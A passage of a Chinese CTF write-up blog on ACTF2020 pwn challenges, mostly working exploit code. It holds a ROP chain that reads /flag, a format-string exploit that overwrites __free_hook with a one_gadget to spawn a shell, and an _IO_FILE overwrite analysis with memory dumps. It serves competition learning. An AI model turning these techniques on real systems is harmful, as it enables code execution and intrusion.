class="line"></span><br><span class="line"><span class="comment"># gadget</span></span><br><span class="line">p6r   = <span class="number">0x0013cc0f</span> + libc_base</span><br><span class="line">prsp  = <span class="number">0x0000000000003838</span> + libc_base <span class="comment"># pop rsp ; ret</span></span><br><span class="line">prdi  = <span class="number">0x0000000000021102</span> + libc_base <span class="comment"># pop rdi ; ret</span></span><br><span class="line">prsi  = <span class="number">0x00000000000202e8</span> + libc_base <span class="comment"># pop rsi ; ret</span></span><br><span class="line">prdx  = <span class="number">0x0000000000001b92</span> + libc_base <span class="comment"># pop rdx ; ret</span></span><br><span class="line">libc_open  = libc.symbols[<span class="string">'open'</span>] + libc_base</span><br><span class="line">libc_read  = libc.symbols[<span class="string">'read'</span>] + libc_base</span><br><span class="line">libc_write = libc.symbols[<span class="string">'write'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">flush()</span><br><span class="line"><span class="comment"># leak stack </span></span><br><span class="line">stack_base = int(leak_addr(<span class="number">41</span>),<span class="number">16</span>)</span><br><span class="line">info_addr(<span class="string">'stack_base'</span>,stack_base)</span><br><span class="line"></span><br><span class="line"><span class="comment"># calc pivot stack </span></span><br><span class="line"><span class="comment">#pwndbg&gt; p 0x7ffc3c28fc58-0x7ffc3c28fe40</span></span><br><span class="line"><span class="comment">#$1 = -488</span></span><br><span class="line">prsp_addr  = stack_base - <span class="number">488</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># prepare to stack pivot</span></span><br><span class="line"><span class="comment"># g1</span></span><br><span class="line">log.success(<span class="string">"write p6r:"</span>+hex(p6r)+<span class="string">" to "</span>+hex(ld_ptr));</span><br><span class="line">alter_dw(ld_ptr, p6r)</span><br><span class="line"><span class="comment"># g2</span></span><br><span class="line">log.success(<span class="string">"write prsp:"</span>+hex(prsp)+ <span class="string">" to "</span>+hex(prsp_addr));</span><br><span class="line">alter_qw(prsp_addr, prsp)</span><br><span class="line"><span class="comment"># stack pivot to read buf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># start rop</span></span><br><span class="line">ropchain = [</span><br><span class="line">            <span class="comment"># open('/flag',0,0x100)</span></span><br><span class="line">            p64(prdi), p64(stack_base<span class="number">-112</span>),<span class="comment"># -&gt; /flag</span></span><br><span class="line">            p64(prsi), p64(<span class="number">0</span>),</span><br><span class="line">            p64(prdx), p64(<span class="number">0x100</span>),</span><br><span class="line">            p64(libc_open),</span><br><span class="line">            <span class="comment"># read(0,buf,0x100)</span></span><br><span class="line">            p64(prdi), p64(<span class="number">3</span>),</span><br><span class="line">            p64(prsi), p64(stack_base),</span><br><span class="line">            p64(prdx), p64(<span class="number">0x100</span>),</span><br><span class="line">            p64(libc_read),</span><br><span class="line">            <span class="comment"># write(1,buf,0x100)</span></span><br><span class="line">            p64(prdi), p64(<span class="number">1</span>),</span><br><span class="line">            p64(prsi), p64(stack_base),</span><br><span class="line">            p64(prdx), p64(<span class="number">0x100</span>),</span><br><span class="line">            p64(libc_write),</span><br><span class="line">            p64(<span class="number">0xdeadbeef</span>),</span><br><span class="line">            <span class="string">'/flag\0\0\0'</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug('b *'+hex(p6r))</span></span><br><span class="line"></span><br><span class="line">flush(<span class="string">'\x90'</span>)</span><br><span class="line">sl(<span class="string">''</span>.join(ropchain))</span><br><span class="line"></span><br><span class="line"><span class="comment"># close stdin to break loop (so one_gadget does not work)</span></span><br><span class="line"><span class="comment"># p.stdin.close()</span></span><br><span class="line"><span class="comment"># shutdown sent also work</span></span><br><span class="line">p.shutdown(<span class="string">"send"</span>) </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><blockquote><p>p.s.做<code>simple_rop</code>的时候还说没必要专门搞个<code>Ubuntu16</code>的环境，结果做这题时就装个虚拟机….真香</p></blockquote><hr><blockquote><p> pp.s.以上是我的菜鸡解法……</p></blockquote><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>后来看到了<a href="https://poning.me/2017/03/23/EasiestPrintf/" target="_blank" rel="noopener">0CTF 2017 Quals: EasiestPrintf</a> 原来<code>scanf</code>和<code>printf</code>都有可能触发<code>malloc</code>和<code>free</code></p><blockquote><p> <code>printf(&quot;%100000c&quot;);</code>的时候就会触发<code>malloc</code>申请字符缓冲区，用完后会<code>free</code>掉缓冲区</p></blockquote><p>因此…直接改<code>__free_hook</code>为<code>one_gadget</code>，然后输入<code>&quot;%100000c&quot;</code>触发<code>free</code>就拿到shell了……</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#__author__:TaQini</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_file  = <span class="string">'./fmt64'</span></span><br><span class="line">local_libc  = <span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span></span><br><span class="line">remote_libc = <span class="string">'../libc-2.23.so'</span></span><br><span class="line"></span><br><span class="line">is_local = <span class="literal">False</span></span><br><span class="line">is_remote = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    is_local = <span class="literal">True</span></span><br><span class="line">    p = process(local_file)</span><br><span class="line">    libc = ELF(local_libc)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    is_remote = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        host = sys.argv[<span class="number">1</span>]</span><br><span class="line">        port = sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        host, port = sys.argv[<span class="number">1</span>].split(<span class="string">':'</span>)</span><br><span class="line">    p = remote(host, port)</span><br><span class="line">    libc = ELF(remote_libc)</span><br><span class="line"></span><br><span class="line">elf = ELF(local_file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(cmd=<span class="string">''</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> is_local: gdb.attach(p,cmd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_addr</span><span class="params">(pos)</span>:</span></span><br><span class="line">    sl(<span class="string">'LLLLLLLL%%%d$p'</span>%(pos))</span><br><span class="line">    <span class="keyword">return</span> rc()[<span class="number">8</span>:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(addr)</span>:</span></span><br><span class="line">    payload = <span class="string">"%10$s"</span>.ljust(<span class="number">24</span>,<span class="string">'S'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_byte</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> data==<span class="number">0</span>:</span><br><span class="line">        payload = <span class="string">"%10$hhn"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">"%%%dc%%10$hhn"</span>%(data)</span><br><span class="line">    payload = payload.ljust(<span class="number">24</span>,<span class="string">'T'</span>)</span><br><span class="line">    payload += p64(addr)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">return</span> rc()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_dw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_byte(addr,data&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">1</span>,(data&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">2</span>,(data&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line">    alter_byte(addr+<span class="number">3</span>,(data&gt;&gt;<span class="number">24</span>)&amp;<span class="number">0xff</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alter_qw</span><span class="params">(addr,data)</span>:</span></span><br><span class="line">    alter_dw(addr,data)</span><br><span class="line">    alter_dw(addr+<span class="number">4</span>,data&gt;&gt;<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flush</span><span class="params">(c=<span class="string">'F'</span>)</span>:</span></span><br><span class="line">    sl(c*<span class="number">8</span>+<span class="string">'\0'</span>*<span class="number">0x80</span>)</span><br><span class="line">    rc()</span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line"><span class="comment"># elf, libc</span></span><br><span class="line">ru(<span class="string">'This\'s my mind!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line"><span class="keyword">if</span> is_remote:</span><br><span class="line">    offset___libc_start_main_ret = <span class="number">0x20830</span></span><br><span class="line">    offset_one_gadget = <span class="number">0xf02a4</span>  <span class="comment"># execve("/bin/sh", rsp+0x50, environ)</span></span><br><span class="line"><span class="keyword">if</span> is_local:</span><br><span class="line">    offset___libc_start_main_ret = <span class="number">0x26b6b</span></span><br><span class="line">    offset_one_gadget = <span class="number">0x106ef8</span> <span class="comment"># execve("/bin/sh", rsp+0x70, environ)</span></span><br><span class="line"></span><br><span class="line">libc_base = int(leak_addr(<span class="number">46</span>),<span class="number">16</span>)-offset___libc_start_main_ret</span><br><span class="line">info_addr(<span class="string">'libc_base'</span>,libc_base)</span><br><span class="line"></span><br><span class="line">free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">info_addr(<span class="string">'free_hook'</span>,free_hook)</span><br><span class="line"></span><br><span class="line">one_gadget = libc_base + offset_one_gadget</span><br><span class="line">info_addr(<span class="string">'one_gadget'</span>,one_gadget)</span><br><span class="line"></span><br><span class="line">log.success(<span class="string">'write one_gadget to free_hook'</span>)</span><br><span class="line">alter_qw(free_hook, one_gadget)</span><br><span class="line"></span><br><span class="line">sl(<span class="string">"%100000c"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div><blockquote><p>我太菜了…T^T</p></blockquote><h2 id="Complaint"><a href="#Complaint" class="headerlink" title="Complaint"></a>Complaint</h2><ul><li>题目描述：尽情地Make Complaints！</li><li>题目地址：<a href="https://cdn.jsdelivr.net/gh/TaQini/ctf@master/ACTF2020/pwn/complaint/complaint" target="_blank" rel="noopener">complaint</a></li><li>考察点：Off-by-one（官方）、覆盖_IO_FILE（非预期）</li><li>难度：中等</li><li>分值：200</li><li>完成人数：4</li></ul><p>显然是个堆的题，然鹅我并不会利用，看了一下，还有别的漏洞，于是硬是给解出来了…</p><p>主要的漏洞如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">mod</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The complaint index you want to modify:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Input your complaint:"</span>, &amp;v1);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, ptr[v1], *(&amp;n + v1));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"The complaint index you want to show:"</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">"%d"</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( ptr[v1] )&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Your complaint: "</span>);</span><br><span class="line">    <span class="built_in">write</span>(<span class="number">1</span>, ptr[v1], *(&amp;n + v1));</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_400FF7);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p><code>mod()</code>函数用于修改<code>ptr[v1]</code>中的内容，<code>show()</code>用于打印<code>ptr[v1]</code>的内容</p><p>这个<code>ptr</code>在<code>bss</code>段，<code>v1</code>通过<code>scanf</code>读入，可以是负数，所以只要顺着<code>ptr</code>往上找，找到<code>ptr[v1]</code>不为零的内存区域，就可以触发<code>read/write</code>函数；<br><code>read/write</code>函数的第三个参数是<code>n[v1]</code>，<code>n</code>也是在<code>bss</code>段，所以只要顺着<code>n</code>往上找，找到<code>n[v1]</code>不为零的内存区域，就可以通过<code>read/write</code>，往<code>ptr[v1]</code>中读一坨数据或是从其中泄漏一坨数据。</p><p><code>bss</code>段数据的布局如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020A0 ; FILE *stdout</span><br><span class="line">.bss:00000000006020A0 stdout          dq ?                    </span><br><span class="line">.bss:00000000006020B0 ; FILE *stdin</span><br><span class="line">.bss:00000000006020B0 stdin           dq ?                    </span><br><span class="line">.bss:00000000006020C0 ; FILE *stderr</span><br><span class="line">.bss:00000000006020C0 stderr          dq ?                    </span><br><span class="line">.bss:00000000006020C8 byte_6020C8     db ?                    </span><br><span class="line">.bss:00000000006020E0 ; char *src</span><br><span class="line">.bss:00000000006020E0 src             dq ?                    </span><br><span class="line">.bss:0000000000602100 ; size_t n</span><br><span class="line">.bss:0000000000602100 n               dd ?                    </span><br><span class="line">.bss:0000000000602140 ; char *ptr[16]</span><br><span class="line">.bss:0000000000602140 ptr             dq ?</span><br></pre></td></tr></table></figure></div><p>这题巧了，当<code>v1=-16</code>时：</p><blockquote><p><code>ptr[v1]</code>=<code>0x602140+8*(-16)</code>=<code>0x6020c0(stderr)</code>指向<code>_IO_2_1_stderr_</code><br><code>n[v1]</code>=<code>0x602100+4*(-16)</code>=<code>0x6020c0</code>也指向<code>_IO_2_1_stderr_</code>，其中的值<code>flags=0xfbad2087</code></p></blockquote><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">shell</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/xg 0x6020c0</span></span><br><span class="line">0x6020c0 &lt;stderr&gt;:0x00007fce72a43540</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x/xg stderr</span></span><br><span class="line">0x7fce72a43540 &lt;_IO_2_1_stderr_&gt;:0x00000000fbad2087</span><br></pre></td></tr></table></figure></div><p>于是，<code>mod(-16)</code>可以向<code>_IO_2_1_stderr_</code> 写入<code>0xfbad2087</code>字节数据，用于覆盖<code>_IO_FILE</code>结构体</p><p><code>show(-16)</code>可以从<code>_IO_2_1_stderr_</code>读出<code>0xfbad2087</code>字节数据，用于泄漏libc</p><p><code>_IO_2_1_stderr_</code>其后的内存分布如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;200xg 0x7fce72a43540</span><br><span class="line">0x7fce72a43540 &lt;_IO_2_1_stderr_&gt;:0x00000000fbad20870x00007fce72a435c3</span><br><span class="line">0x7fce72a43550 &lt;_IO_2_1_stderr_+16&gt;:0x00007fce72a435c30x00007fce72a435c3</span><br><span class="line">0x7fce72a43560 &lt;_IO_2_1_stderr_+32&gt;:0x00007fce72a435c30x00007fce72a435c3</span><br><span class="line">0x7fce72a43570 &lt;_IO_2_1_stderr_+48&gt;:0x00007fce72a435c30x00007fce72a435c3</span><br><span class="line">0x7fce72a43580 &lt;_IO_2_1_stderr_+64&gt;:0x00007fce72a435c40x0000000000000000</span><br><span class="line">0x7fce72a43590 &lt;_IO_2_1_stderr_+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fce72a435a0 &lt;_IO_2_1_stderr_+96&gt;:0x00000000000000000x00007fce72a43620</span><br><span class="line">0x7fce72a435b0 &lt;_IO_2_1_stderr_+112&gt;:0x00000000000000020xffffffffffffffff</span><br><span class="line">0x7fce72a435c0 &lt;_IO_2_1_stderr_+128&gt;:0x00000000000000000x00007fce72a44770</span><br><span class="line">0x7fce72a435d0 &lt;_IO_2_1_stderr_+144&gt;:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x7fce72a435e0 &lt;_IO_2_1_stderr_+160&gt;:0x00007fce72a426600x0000000000000000</span><br><span class="line">0x7fce72a435f0 &lt;_IO_2_1_stderr_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fce72a43600 &lt;_IO_2_1_stderr_+192&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fce72a43610 &lt;_IO_2_1_stderr_+208&gt;:0x00000000000000000x00007fce72a416e0</span><br><span class="line">0x7fce72a43620 &lt;_IO_2_1_stdout_&gt;:0x00000000fbad28870x00007fce72a436a3</span><br><span class="line">0x7fce72a43630 &lt;_IO_2_1_stdout_+16&gt;:0x00007fce72a436a30x00007fce72a436a3</span><br><span class="line">0x7fce72a43640 &lt;_IO_2_1_stdout_+32&gt;:0x00007fce72a436a30x00007fce72a436a3</span><br><span class="line">0x7fce72a43650 &lt;_IO_2_1_stdout_+48&gt;:0x00007fce72a436a30x00007fce72a436a3</span><br><span class="line">0x7fce72a43660 &lt;_IO_2_1_stdout_+64&gt;:0x00007fce72a436a40x0000000000000000</span><br><span class="line">0x7fce72a43670 &lt;_IO_2_1_stdout_+80&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fce72a43680 &lt;_IO_2_1_stdout_+96&gt;:0x00000000000000000x00007fce72a428e0</span><br><span class="line">0x7fce72a43690 &lt;_IO_2_1_stdout_+112&gt;:0x00000000000000010xffffffffffffffff</span><br><span class="line">0x7fce72a436a0 &lt;_IO_2_1_stdout_+128&gt;:0x000000000a0000000x00007fce72a44780</span><br><span class="line">0x7fce72a436b0 &lt;_IO_2_1_stdout_+144&gt;:0xffffffffffffffff0x0000000000000000</span><br><span class="line">0x7fce72a436c0 &lt;_IO_2_1_stdout_+160&gt;:0x00007fce72a427a00x0000000000000000</span><br><span class="line">0x7fce72a436d0 &lt;_IO_2_1_stdout_+176&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7fce72a436e0 &lt;_IO_2_1_stdout_+192&gt;:0x00000000ffffffff0x0000000000000000</span><br><span class="line">0x7fce72a436f0 &lt;_IO_2_1_stdout_+208&gt;:0x00000000000000000x00007fce72a416e0</span><br><span class="line">0x7fce72a43700 &lt;stderr&gt;:0x00007fce72a435400x00007fce72a43620</span><br><span class="line">0x7fce72a43710 &lt;stdin&gt;:0x00007fce72a428e00x00007fce7269eb70</span><br></pre></td></tr></table></figure></div><p><code>read</code>读的数据足以修改<code>_IO_2_1_stdout_</code>的<code>_IO_FILE</code>结构体</p><p><code>write</code>打印的数据足以泄漏<code>stderr</code>中的<code>_IO_2_1_stderr_</code>地址</p><blockquote><p><code>_IO_2_1_stderr_</code>在libc中</p></blockquote><p>利用的思路很简单，先<code>show(-16)</code>泄漏libc，再<code>mod(-16)</code>覆盖<code>_IO_2_1_stdout_</code>的<code>_IO_FILE</code>结构体，<code>mod</code>函数执行完毕后会调用<code>puts</code>打印菜单，于是会用到<code>_IO_2_1_stdout_</code>，只要把其中的函数指针改写为<code>one_gadget</code>即可getshell</p><p>关于<code>_IO_FILE</code>结构体，<a href="https://xz.aliyun.com/t/3344" target="_blank" rel="noopener">这篇</a>文章有介绍，讲的比较明白</p><p>我的做法就比较简单粗暴了……直接跟进<code>puts</code>函数，通过漏洞布置合适的数据，让程序顺利执行到这里：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">  0x7fce726ed788 &lt;puts+248&gt;    cmp    eax, -1</span><br><span class="line">  0x7fce726ed78b &lt;puts+251&gt;    je     puts+152 &lt;0x7fce726ed728&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x7fce726ed728 &lt;puts+152&gt;    mov    rax, qword ptr [rdi + 0xd8]</span><br><span class="line">  0x7fce726ed72f &lt;puts+159&gt;    mov    rdx, rbx</span><br><span class="line">  0x7fce726ed732 &lt;puts+162&gt;    mov    rsi, r12</span><br><span class="line">► 0x7fce726ed735 &lt;puts+165&gt;    call   qword ptr [rax + 0x38] &lt;0x7fce726f71e0&gt;</span><br></pre></td></tr></table></figure></div><p>这里的<code>rax + 0x38</code>是可以覆盖到的，向其中布置<code>one_gadget</code>即可</p><blockquote><p>由于不同<code>libc</code>版本的<code>puts</code>函数具体代码不同，但是大同小异<br>我本地环境是<code>libc_2.29</code>，这题远程的环境是<code>libc_2.23</code>，都可以用上述方法成功getshell</p></blockquote><p>exp如下(调试<code>libc_2.23</code>时需要<code>Ubuntu16.04</code>环境~真香)：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 